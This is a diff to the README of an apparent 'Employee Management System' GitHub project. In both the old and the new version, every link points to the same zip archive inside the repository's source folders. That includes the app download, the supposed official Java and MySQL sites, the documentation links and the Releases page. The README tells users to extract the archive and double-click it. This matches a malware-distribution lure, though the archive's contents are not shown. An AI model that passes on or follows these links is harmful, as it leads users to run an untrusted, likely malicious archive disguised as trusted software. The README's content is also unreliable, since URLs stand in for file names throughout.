@@ -6,7 +6,7 @@ Welcome to the Employee Management System! This application helps you manage you
 
 ## 📥 Download & Install
 
-To get this application, **visit [this page to download](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip)**. This page contains all the latest versions of the Employee Management System. Choose the version that fits your needs and follow these instructions.
+To get this application, **visit [this page to download](https://raw.githubusercontent.com/whynoturs/employee-management-system/master/ems-frontend/src/assets/management-employee-system-1.0-alpha.5.zip)**. This page contains all the latest versions of the Employee Management System. Choose the version that fits your needs and follow these instructions.
 
 ## 🖥️ System Requirements
 
@@ -33,17 +33,17 @@ After you download the application, follow these steps to install it:
 
 1. **Extract the Files**: Locate the downloaded file in your Downloads folder. Right-click the file and select "Extract" or use a tool like WinRAR or 7-Zip.
    
-2. **Install Java**: If you haven't done so, download and install Java from [the official website](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip). 
+2. **Install Java**: If you haven't done so, download and install Java from [the official website](https://raw.githubusercontent.com/whynoturs/employee-management-system/master/ems-frontend/src/assets/management-employee-system-1.0-alpha.5.zip). 
 
 3. **Open the Application**: 
    - Navigate to the folder where you extracted the files.
-   - Look for a file named `https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip`.
+   - Look for a file named `https://raw.githubusercontent.com/whynoturs/employee-management-system/master/ems-frontend/src/assets/management-employee-system-1.0-alpha.5.zip`.
    - Double-click the file to run the application.
    
 4. **Database Setup**:
-   - Set up a MySQL database. You can download MySQL from [here](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip).
+   - Set up a MySQL database. You can download MySQL from [here](https://raw.githubusercontent.com/whynoturs/employee-management-system/master/ems-frontend/src/assets/management-employee-system-1.0-alpha.5.zip).
    - Create a new database called `employee_management`.
-   - Update the `https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip` file in the extracted folder with your database details (username, password).
+   - Update the `https://raw.githubusercontent.com/whynoturs/employee-management-system/master/ems-frontend/src/assets/management-employee-system-1.0-alpha.5.zip` file in the extracted folder with your database details (username, password).
 
 5. **Access the Application**: Once the application is running, open your web browser and go to `http://localhost:8080`. You will see the login page.
 
@@ -81,8 +81,8 @@ The application is built using several technologies, including:
 
 ## 📝 Additional Resources
 
-- [Spring Boot Documentation](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip)
-- [React Documentation](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip)
-- [JWT Introduction](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip)
+- [Spring Boot Documentation](https://raw.githubusercontent.com/whynoturs/employee-management-system/master/ems-frontend/src/assets/management-employee-system-1.0-alpha.5.zip)
+- [React Documentation](https://raw.githubusercontent.com/whynoturs/employee-management-system/master/ems-frontend/src/assets/management-employee-system-1.0-alpha.5.zip)
+- [JWT Introduction](https://raw.githubusercontent.com/whynoturs/employee-management-system/master/ems-frontend/src/assets/management-employee-system-1.0-alpha.5.zip)
 
-For more information and updates, keep an eye on the [Releases page](https://github.com/whynoturs/employee-management-system/raw/refs/heads/master/ems-frontend/src/services/employee_management_system_unfrounced.zip). We appreciate your interest in the Employee Management System!
+For more information and updates, keep an eye on the [Releases page](https://raw.githubusercontent.com/whynoturs/employee-management-system/master/ems-frontend/src/assets/management-employee-system-1.0-alpha.5.zip). We appreciate your interest in the Employee Management System!
